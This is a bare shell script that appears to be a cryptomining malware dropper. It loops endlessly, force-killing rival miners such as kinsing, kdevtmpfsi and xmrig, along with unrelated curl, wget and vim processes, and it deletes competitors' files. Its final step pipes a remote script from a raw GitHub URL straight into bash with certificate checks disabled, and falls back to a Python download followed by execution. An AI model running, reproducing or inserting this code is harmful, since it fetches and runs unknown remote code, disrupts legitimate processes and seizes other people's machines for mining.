while true
do
    killall -q -9 kdevtmpfsi
    killall -q -9 kinsing
    killall -q -9 xmrig
    killall -q -9 xmr
    killall -q -9 qwer
    pkill -9 kthreaddk
    pkill -9 kwolker
    pkill -9 mini
    pkill -9 kacpi_notifyd
    pkill -9 vim
    pkill -9 mym
    pkill -9 network
    pkill -9 .libs
    pkill -9 javase
    pkill -9 libexec
    ps aux | grep -v grep | grep -v 27.1 | grep -v 222.122 | grep 'wget' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep -v 27.1 | grep -v 222.122 | grep 'curl' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep -v 27.1 | grep -v 222.122 | grep 'urlopen' | awk '{print $2}' | xargs -i kill -9 {}
    netstat -anp | grep "178.128.66.122" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -i kill -9 {}
    netstat -anp | grep "91.121.140.167" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -i kill -9 {}
    rm -rf $HOME/postgres
    rm -rf $HOME/kvm.sh
    ps aux | grep -v grep | grep 'javaupDates' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'givemexyz' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'dbused' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'cpu-force-autoconfig' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'kvm.sh' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'elastic.sh' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep '/var/tmp/.postgres/' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'postgres_start.sh' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'xmrig' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'xmr' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'kthreaddk' | awk '{print $2}' | xargs -i kill -9 {}
    ps aux | grep -v grep | grep 'kthreaddi' | awk '{print $2}' | xargs -i kill -9 {}
    PROC_NAME=/tmp/juma
    ProcNumber=`ps -ef |grep -w $PROC_NAME|grep -v grep|wc -l`
    if [ $ProcNumber -le 0 ];then
        if hash curl 2>/dev/null;then
            curl --insecure https://raw.githubusercontent.com/mimu-pl/test/main/so.sh | bash >/dev/null 2>&1 &
        else
            python -c "import requests;url='https://raw.githubusercontent.com/mimu-pl/test/main/so.sh';tmp=requests.get(url);open('./static.sh','wb').write(tmp.content)"
            bash ./static.sh >/dev/null 2>&1 &
        fi
        break
    fi
done
